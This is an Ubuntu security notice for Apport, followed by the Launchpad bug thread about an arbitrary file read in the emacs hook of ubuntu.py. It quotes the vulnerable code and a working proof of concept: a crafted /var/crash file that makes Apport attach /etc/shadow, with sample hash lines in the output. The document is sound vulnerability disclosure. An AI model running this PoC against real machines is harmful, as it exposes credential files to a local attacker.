# USN-5077-1: Apport vulnerabilities

14 September 2021

Several security issues were fixed in Apport.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 21.04](/security/notices?release=hirsute)
* [Ubuntu 20.04 LTS](/security/notices?release=focal)
* [Ubuntu 18.04 ESM](/security/notices?release=bionic)

## Packages

* [apport](/security/cves?package=apport) - automatically generate crash reports for debugging

## Details

Maik Münch and Stephen Röttger discovered that Apport incorrectly handled

certain information gathering operations. A local attacker could use this

issue to gain read access to arbitrary files, possibly containing sensitive

information.

# Arbitrary file read in general hook (ubuntu.py)

Bug #1934308 reported by
[mal](https://launchpad.net/~mallle)
on 2021-07-01

[258](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [Apport](https://bugs.launchpad.net/apport) | Fix Released | Critical | Unassigned | [Apport 2.21.0](https://launchpad.net/apport/%2Bmilestone/2.21.0) |
|  | [apport (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/apport "Latest release: 2.31.0-0ubuntu2, uploaded to main on 2024-12-21 12:23:10.144735+00:00 by Julian Andres Klode (juliank), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Fix Released | Critical | Unassigned |  |

### Bug Description

While reviewing Apport's general hooks it was found that the hook `apport/general-hooks/ubuntu.py` includes user controlled files when handling `emacs`-related reports:

if report['Package'] in ['emacs22', 'emacs23', 'emacs-snapshot', 'xemacs21']:

    # emacs add-on packages trigger byte compilation, which might fail

    # we are very interested in reading the compilation log to determine

    # where to reassign this report to

    regex = r'^!! Byte-compilation for x?emacs\S+ failed!'

    if attachment in report and re.search(regex, log\_file, re.MULTILINE):

        for line in log\_file.split('\n'):

            m = re.search(r'^!! and attach the file (\S+)', line) # [0]

            if m:

                path = m.group(1)

                apport.hookutils.attach\_file\_if\_exists(report, path) # [1]

After using a regular expression to extract the file to attach [0], the extracted file subsequently gets attached to the report file [1].

With automatic crash reporting enabled the following PoC (tested on 20.04/21.04 Desktop) includes the file `/etc/shadow` in the respective report file:

cat << EOF > /var/crash/poc.crash

ProblemType: Package

ExecutablePath: /poc

Package: emacs22

DpkgTerminalLog: !! Byte-compilation for emacs22 failed!

 !! and attach the file /etc/shadow

EOF

grep -A5 DpkgTerminal /var/crash/poc.crash

DpkgTerminalLog: !! Byte-compilation for emacs22 failed!

 !! and attach the file /etc/shadow

.etc.shadow:

 root:!:18393:0:99999:7:::

 daemon:\*:18375:0:99999:7:::

 bin:\*:18375:0:99999:7:::

I am unable to reproduce this issue on an up to date Ubuntu 20.04 desktop install - when apport sees the crash file it runs but is not able to access /etc/shadow so this does not get attached - am I missing something? Can you please provide instructions for reproducing this on a fresh Ubuntu 20.04 install?

I just confirmed it on a freshly installed VM (Ubuntu 20.04 Desktop, VMware Workstation 16 Player, Easy Install):

\* Update: sudo apt update && sudo apt dist-upgrade

\* Enable automatic problem reporting: Settings -> Diagnostics -> Send error reports to Canonical -> Automatic

\* Reboot

m@ubuntu:~$ cat << EOF > /var/crash/poc.crash

> ProblemType: Package

> ExecutablePath: /poc

> Package: emacs22

> DpkgTerminalLog: !! Byte-compilation for emacs22 failed!

The emacs packages haven't stored the byte compilation results in log files for years, at least since emacs22, so we can just remove this code completely.

I propose we publish these updates on 2021-09-14.

That will allow us to perform the final testing of these updates this week.

Please advise if that public date is problematic.
